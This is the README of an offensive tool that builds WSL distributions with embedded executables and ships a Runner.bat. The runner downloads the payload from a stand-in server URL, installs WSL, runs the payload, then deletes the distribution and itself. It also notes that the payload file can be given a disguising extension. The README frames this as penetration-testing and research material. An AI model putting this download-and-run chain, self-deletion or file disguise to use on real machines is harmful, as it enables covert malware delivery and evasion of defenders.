# WSL Payload Builder
## Disclaimer
This tool is intended for legitimate security research and penetration testing. Users are responsible for ensuring they have proper authorization before testing systems they do not own or have explicit permission to test.
## Overview
A shell script for creating minimal WSL (Windows Subsystem for Linux) distributions with embedded payloads. This tool automates the process of building Alpine Linux-based WSL distributions that can execute custom payloads upon launch.

The `Build_WSL_Payload.sh` script downloads the latest Alpine Linux rootfs, customizes it for WSL use, embeds a user-specified executable, and packages everything into a distributable `.wsl` file. 

The `Runner.bat` will download the WSL config file from the provided URL and launch it **(will install wsl if not present and admin rights are available)**

This is particularly useful for penetration testing, security research, and custom WSL environment creation.

## Usage

### Building Payloads (Linux/macOS/Windows(WSL))
#### Arguments

- **`-N, --name`**: Specify the default distribution name for WSL
- **`-P, --payload`**: Specify the path to the payload executable file
- **`-H, --help`**: Display the help menu

#### Examples

```bash
# Build a WSL distribution named "CalcWSL" with a custom payload
./Build_WSL_Payload.sh -N CalcWSL -P ./Calc.exe
```
### Running Payloads (Windows)

#### Basic Usage

Option 1.
**Double-Click** - Double clicking the WSL file will execute the payload but will also open a cmd prompt that must be closed manually. (Not recommended)

Option 2.
**Use the Runner.bat file**

```cmd
C:\Users\USER_NAME> .\Runner.bat
```

#### What it does

The `Runner.bat` script automatically:

1. **Downloads** the WSL payload file from a configured URL
2. **Checks** if WSL is already installed on the system
3. **Installs** WSL if not present (requires administrator privileges)
4. **Installs** the downloaded WSL distribution
5. **Cleans up** by removing the distribution and itself after execution.

#### Requirements

- **Windows 10/11** with WSL support
- **Administrator privileges** (if WSL is not already installed)
- **Internet connection** to download the payload file if using the .bat script

#### Configuration

Edit the variables at the top of `Runner.bat` to customize:

```batch
set "DOWNLOAD_URL=https://your-server.com/payload.wsl"
set "WSL_FILE=payload.log" # Still testing but can use most file extensions here. 
```
## References

This project was inspired by and builds upon the research and techniques documented in the [dmcxblue/WSL-Payloads](https://github.com/dmcxblue/WSL-Payloads) repository, which provides valuable insights into WSL file format weaponization and security research.


## License
MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

